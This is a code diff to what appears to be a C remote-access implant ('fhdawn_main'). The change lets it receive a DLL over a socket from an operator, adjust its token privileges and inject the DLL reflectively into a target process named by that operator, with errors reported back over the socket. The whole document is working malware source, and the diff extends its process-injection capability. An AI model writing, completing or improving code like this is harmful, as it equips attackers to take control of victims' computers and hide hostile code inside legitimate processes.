@@ -9,8 +9,8 @@ Modified: -
 #include "LoadLibraryR.h"
 
 int fsize = 0;
-char* fileinfo[2];
-#define BREAK_WITH_ERROR( e ) { printf( "[-] %s. Error=%d", e, GetLastError() ); break; }
+char* fileinfo[3];
+#define BREAK_WITH_ERROR( e ) { sockprintf(sockfd, "[-] %s. Error=%ld", e, GetLastError() ); break; }
 
 
 // By @augustgl (github.com/augustgl)
@@ -133,6 +133,7 @@ void fhdawn_main(void)
             }
             split(recvbuf, fileinfo, ":");
             int expected = atoi(fileinfo[1]);
+            DWORD dwProcessId = ProcessId(fileinfo[2]);
             unsigned char* DLL = HeapAlloc(GetProcessHeap(), 0, expected + 1);
             //unsigned char* DLL = malloc(expected + 1);
             memset(recvbuf, '\0', BUFFER);
@@ -146,7 +147,6 @@ void fhdawn_main(void)
 
             sockprintf(sockfd, "Got DLL of size %i bytes.\n", total);
             
-            DWORD dwProcessId = GetCurrentProcessId();
             do {
                 if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
                 {
@@ -163,16 +163,22 @@ void fhdawn_main(void)
                 if (!hProcess)
                     BREAK_WITH_ERROR("Failed to open the target process");
 
-                hModule = LoadRemoteLibraryR(hProcess, (LPVOID)DLL, expected + 1, NULL);
+                hModule = LoadRemoteLibraryR(hProcess, DLL, expected + 1, NULL);
                 if (!hModule)
                     BREAK_WITH_ERROR("Failed to inject the DLL");
 
                 WaitForSingleObject(hModule, -1);
             } while (0);
 
-            free(DLL);
+            if (DLL)
+            {
+                HeapFree(GetProcessHeap(), 0, DLL);
+
+            }
             if (hProcess)
+            {
                 CloseHandle(hProcess);
+            }
 
         }
         else {
